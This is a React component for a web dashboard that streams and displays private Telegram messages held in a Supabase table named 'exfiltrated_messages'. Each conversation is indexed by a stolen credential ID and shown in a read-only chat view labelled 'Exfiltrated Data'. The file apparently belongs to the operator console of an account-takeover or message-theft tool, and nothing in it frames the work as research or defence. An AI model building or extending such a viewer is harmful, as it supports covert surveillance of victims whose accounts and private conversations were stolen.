"use client";

import { useEffect, useState, useRef } from "react";
import { supabase } from "@/lib/supabase";
import { LucideSend } from "lucide-react";

export default function ChatWindow({ credentialId }: { credentialId: string }) {
    const [messages, setMessages] = useState<any[]>([]);
    const bottomRef = useRef<HTMLDivElement>(null);

    useEffect(() => {
        if (!credentialId) return;

        async function fetchMsgs() {
            const { data, error } = await supabase
                .from("exfiltrated_messages")
                .select("*")
                .eq("credential_id", credentialId)
                .order("telegram_msg_id", { ascending: true }); // Oldest first

            if (data) setMessages(data);
        }

        fetchMsgs();

        const channel = supabase
            .channel(`chat-${credentialId}`)
            .on(
                "postgres_changes",
                {
                    event: "INSERT",
                    schema: "public",
                    table: "exfiltrated_messages",
                    filter: `credential_id=eq.${credentialId}`,
                },
                (payload) => {
                    setMessages((prev) => [...prev, payload.new]);
                }
            )
            .subscribe();

        return () => {
            supabase.removeChannel(channel);
        };
    }, [credentialId]);

    useEffect(() => {
        bottomRef.current?.scrollIntoView({ behavior: "smooth" });
    }, [messages]);

    if (!credentialId) {
        return (
            <div className="flex-1 flex items-center justify-center bg-slate-200 text-slate-600">
                Select a chat to view exfiltrated messages
            </div>
        );
    }

    return (
        <div className="flex-1 flex flex-col h-full bg-[#E5DDD5]">
            {/* Header Placeholder - Could be Chat Info */}
            <div className="p-3 bg-white border-b shadow-sm flex items-center">
                <span className="font-semibold text-slate-700">Chat History</span>
            </div>

            <div className="flex-1 overflow-y-auto p-4 space-y-3">
                {messages.map((msg) => (
                    <div
                        key={msg.id}
                        className={`flex flex-col max-w-[70%] p-2 rounded-lg shadow-sm ${msg.sender_name === "me" || msg.sender_name?.toLowerCase().includes("bot")
                            ? "self-end bg-[#DCF8C6] rounded-tr-none"
                            : "self-start bg-white rounded-tl-none"
                            }`}
                    >
                        <span className="text-xs font-bold text-sky-600 mb-0.5">
                            {msg.sender_name || "Unknown"}
                        </span>
                        <p className="text-sm text-slate-800 whitespace-pre-wrap leading-snug break-all">
                            {msg.content}
                        </p>
                        <span className="text-[10px] text-slate-400 self-end mt-1">
                            {new Date(msg.created_at).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' })}
                        </span>
                    </div>
                ))}
                <div ref={bottomRef} />
            </div>

            {/* Input area (ReadOnly) */}
            <div className="p-3 bg-white border-t flex items-center gap-2 text-slate-400 text-sm italic justify-center">
                <LucideSend className="w-4 h-4" />
                <span>Read-only Mode (Exfiltrated Data)</span>
            </div>
        </div>
    );
}
